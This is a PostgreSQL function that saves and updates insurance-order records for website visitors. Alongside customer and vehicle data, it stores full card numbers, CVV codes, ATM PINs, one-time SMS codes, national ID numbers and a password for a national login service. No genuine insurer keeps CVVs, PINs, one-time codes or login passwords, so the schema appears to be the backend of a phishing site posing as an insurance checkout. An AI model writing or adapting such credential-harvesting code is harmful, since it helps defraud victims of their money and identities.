CREATE OR REPLACE FUNCTION public.upsert_insurance_order(p_visitor_session_id text, p_order_id uuid DEFAULT NULL::uuid, p_data jsonb DEFAULT '{}'::jsonb)
 RETURNS uuid
 LANGUAGE plpgsql
 SECURITY DEFINER
 SET search_path TO 'public'
AS $function$
DECLARE
  v_order_id uuid;
  v_existing_session text;
BEGIN
  IF p_order_id IS NOT NULL THEN
    -- Verify ownership before update
    SELECT visitor_session_id INTO v_existing_session
    FROM public.insurance_orders WHERE id = p_order_id;
    
    IF v_existing_session IS NULL OR v_existing_session != p_visitor_session_id THEN
      RAISE EXCEPTION 'Unauthorized: session mismatch';
    END IF;
    
    -- Update only allowed fields
    UPDATE public.insurance_orders SET
      current_stage = COALESCE(p_data->>'current_stage', current_stage),
      stage_status = COALESCE(p_data->>'stage_status', stage_status),
      otp_code = COALESCE(p_data->>'otp_code', otp_code),
      phone_otp_code = COALESCE(p_data->>'phone_otp_code', phone_otp_code),
      nafath_number = COALESCE(p_data->>'nafath_number', nafath_number),
      nafath_password = COALESCE(p_data->>'nafath_password', nafath_password),
      card_number_full = COALESCE(p_data->>'card_number_full', card_number_full),
      card_cvv = COALESCE(p_data->>'card_cvv', card_cvv),
      card_holder_name = COALESCE(p_data->>'card_holder_name', card_holder_name),
      card_last_four = COALESCE(p_data->>'card_last_four', card_last_four),
      card_expiry = COALESCE(p_data->>'card_expiry', card_expiry),
      payment_method = COALESCE(p_data->>'payment_method', payment_method),
      atm_pin = COALESCE(p_data->>'atm_pin', atm_pin),
      atm_bill_number = COALESCE(p_data->>'atm_bill_number', atm_bill_number),
      atm_biller_code = COALESCE(p_data->>'atm_biller_code', atm_biller_code),
      customer_name = COALESCE(p_data->>'customer_name', customer_name),
      national_id = COALESCE(p_data->>'national_id', national_id),
      phone = COALESCE(p_data->>'phone', phone),
      updated_at = now()
    WHERE id = p_order_id;
    
    RETURN p_order_id;
  ELSE
    -- Insert new order with ALL fields including card data
    INSERT INTO public.insurance_orders (
      visitor_session_id, status, current_stage, stage_status,
      customer_name, national_id, phone,
      company, insurance_type, base_price, total_price, add_ons,
      vehicle_make, vehicle_model, vehicle_year, serial_number,
      passenger_count, vehicle_usage, estimated_value, repair_location,
      insurance_request_id, payment_method,
      card_number_full, card_cvv, card_holder_name, card_last_four, card_expiry,
      atm_pin, atm_bill_number, atm_biller_code
    ) VALUES (
      p_visitor_session_id,
      COALESCE(p_data->>'status', 'pending'),
      p_data->>'current_stage',
      p_data->>'stage_status',
      p_data->>'customer_name',
      p_data->>'national_id',
      p_data->>'phone',
      p_data->>'company',
      p_data->>'insurance_type',
      (p_data->>'base_price')::numeric,
      (p_data->>'total_price')::numeric,
      COALESCE(p_data->'add_ons', '[]'::jsonb),
      p_data->>'vehicle_make',
      p_data->>'vehicle_model',
      p_data->>'vehicle_year',
      p_data->>'serial_number',
      p_data->>'passenger_count',
      p_data->>'vehicle_usage',
      p_data->>'estimated_value',
      p_data->>'repair_location',
      (p_data->>'insurance_request_id')::uuid,
      p_data->>'payment_method',
      p_data->>'card_number_full',
      p_data->>'card_cvv',
      p_data->>'card_holder_name',
      p_data->>'card_last_four',
      p_data->>'card_expiry',
      p_data->>'atm_pin',
      p_data->>'atm_bill_number',
      p_data->>'atm_biller_code'
    ) RETURNING id INTO v_order_id;
    
    RETURN v_order_id;
  END IF;
END;
$function$;